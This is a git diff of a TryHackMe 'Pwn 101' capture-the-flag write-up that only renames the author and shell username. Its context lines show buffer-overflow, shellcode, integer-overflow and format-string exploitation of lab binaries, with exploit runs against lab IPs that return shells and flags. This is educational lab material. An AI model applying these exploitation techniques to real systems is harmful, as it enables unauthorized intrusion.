@@ -1,5 +1,5 @@
 ---
-author: pl4int3xt
+author: 0xbinder
 layout: post
 title: Pwn 101 - Tryhackme
 date: '2024-01-18'
@@ -40,7 +40,7 @@ void main(void)
 Let's run the code and see 
 
 ```shell
-pl4int3xt@archlinux ~/D/p/pwn101> ./pwn101.pwn101
+0xbinder@archlinux ~/D/p/pwn101> ./pwn101.pwn101
        ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
         │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
         ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
@@ -60,14 +60,14 @@ She did Tomato rice instead of briyani :/
 Let's generate 100 A's and see if it overflows the buffer
 
 ```shell
-pl4int3xt@archlinux ~/D/p/pwn101 [124]> python -c 'print ("A"*100)'
+0xbinder@archlinux ~/D/p/pwn101 [124]> python -c 'print ("A"*100)'
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 ```
 
 The A's worked from the local binary
 
 ```shell
-pl4int3xt@archlinux ~/D/p/pwn101> ./pwn101.pwn101
+0xbinder@archlinux ~/D/p/pwn101> ./pwn101.pwn101
        ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
         │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
         ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
@@ -99,7 +99,7 @@ io.interactive()
 We get a shell in the system since the code calls `/bin/sh` after the overflow
 
 ```shell
-pl4int3xt@archlinux ~/D/p/pwn101 [1]> python3 pwn101.py 10.10.95.255 9001
+0xbinder@archlinux ~/D/p/pwn101 [1]> python3 pwn101.py 10.10.95.255 9001
 [+] Opening connection to 10.10.95.255 on port 9001: Done
 [*] Switching to interactive mode
 Type the required ingredients to make briyani: 
@@ -157,7 +157,7 @@ local_10 = 0xc0d3;
 Let's check the security protections with checksec
 
 ```shell
-pl4int3xt@archlinux ~/D/p/pwn102> checksec --file=pwn102.pwn102 
+0xbinder@archlinux ~/D/p/pwn102> checksec --file=pwn102.pwn102 
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
 Full RELRO      No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   73 Symbols	 No	pwn102.pwn102
 ```
@@ -218,7 +218,7 @@ Breakpoint 1 at 0x555555400959
 pwndbg> cyclic 200
 aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa
 pwndbg> run
-Starting program: /home/pl4int3xt/Documents/pwn/pwn102/pwn102.pwn102 
+Starting program: /home/0xbinder/Documents/pwn/pwn102/pwn102.pwn102 
 [Thread debugging using libthread_db enabled]
 Using host libthread_db library "/usr/lib/libthread_db.so.1".
        ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
@@ -275,7 +275,7 @@ io.interactive()
 Let's run the code using the remote server and the provided port to get a shell and the flag
 
 ```shell
-pl4int3xt@archlinux ~/D/p/pwn102> python3 pwn102.py 
+0xbinder@archlinux ~/D/p/pwn102> python3 pwn102.py 
 [+] Opening connection to 10.10.31.35 on port 9002: Done
 [*] Switching to interactive mode
 Yes, I need c0ff33 to c0d3
@@ -331,7 +331,7 @@ Let's fire up pwndbg and crash the program
 pwndbg> cyclic 100
 aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
 pwndbg> run
-Starting program: /home/pl4int3xt/Documents/pwn/pwn103/pwn103.pwn103 
+Starting program: /home/0xbinder/Documents/pwn/pwn103/pwn103.pwn103 
 [Thread debugging using libthread_db enabled]
 Using host libthread_db library "/usr/lib/libthread_db.so.1".
 ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
@@ -406,7 +406,7 @@ io.interactive()
 Running the script on the remote server we get a shell and the flag
 
 ```shell
-pl4int3xt@archlinux ~/D/p/pwn103> python3 pwn103.py
+0xbinder@archlinux ~/D/p/pwn103> python3 pwn103.py
 [+] Opening connection to 10.10.135.73 on port 9003: Done
 [*] Switching to interactive mode
 ------[jopraveen]: Hello pwners 👋
@@ -453,7 +453,7 @@ Running checksec we notice that NX (No Execute) bit is disabled meaning that sto
 > * Finally call the buffer location to execute the shellcode
 
 ```shell
-pl4int3xt@archlinux ~/D/p/pwn104> checksec --file=pwn104.pwn104
+0xbinder@archlinux ~/D/p/pwn104> checksec --file=pwn104.pwn104
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
 Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   46 Symbols	 No	pwn104.pwn104
 ```
@@ -464,7 +464,7 @@ Let's open pwndbg with our binary and try to crash it
 pwndbg> cyclic 100
 aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
 pwndbg> run
-Starting program: /home/pl4int3xt/Documents/pwn/pwn104/pwn104.pwn104 
+Starting program: /home/0xbinder/Documents/pwn/pwn104/pwn104.pwn104 
 [Thread debugging using libthread_db enabled]
 Using host libthread_db library "/usr/lib/libthread_db.so.1".
        ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
@@ -520,7 +520,7 @@ io.interactive()
 Let's run our code and get the flag
 
 ```shell
-pl4int3xt@archlinux ~/D/p/pwn104> python3 pwn104.py
+0xbinder@archlinux ~/D/p/pwn104> python3 pwn104.py
 [+] Opening connection to 10.10.135.73 on port 9004: Done
 [*] Switching to interactive mode
 THM{REDACTED ..}
@@ -586,7 +586,7 @@ We need to perform a simple `int` overflow. we know the `int` range is `-2147483
 Let's try that and cat the flag
 
 ```shell
-pl4int3xt@archlinux ~/D/p/pwn105> nc 10.10.122.55 9005
+0xbinder@archlinux ~/D/p/pwn105> nc 10.10.122.55 9005
        ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
         │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
         ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
@@ -639,7 +639,7 @@ void main(void){
 Running the code we try to leak the address of a pointer using `%p` and it works
 
 ```shell
-pl4int3xt@archlinux ~/D/p/pwn106> ./pwn106user.pwn106-user
+0xbinder@archlinux ~/D/p/pwn106> ./pwn106user.pwn106-user
        ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
         │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
         ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
@@ -684,7 +684,7 @@ for i in range(15):
 Running the code we get the flag between the range `6 - 11`
 
 ```shell
-pl4int3xt@archlinux ~/D/p/pwn106> python3 pwn106.py
+0xbinder@archlinux ~/D/p/pwn106> python3 pwn106.py
 [+] Opening connection to 10.10.207.244 on port 9006: Done
 [*] Closed connection to 10.10.207.244 port 9006
 [+] Opening connection to 10.10.207.244 on port 9006: Done
@@ -780,7 +780,7 @@ void get_streak(void){
 All the protections are enabled. So what we need to do is to leak the stack canary data and the dynamic base address using the string formats vulnerability.
 
 ```shell
-pl4int3xt@archlinux ~/D/p/pwn107> checksec --file=pwn107.pwn107
+0xbinder@archlinux ~/D/p/pwn107> checksec --file=pwn107.pwn107
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
 Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   74 Symbols	 No	pwn107.pwn107
 ```
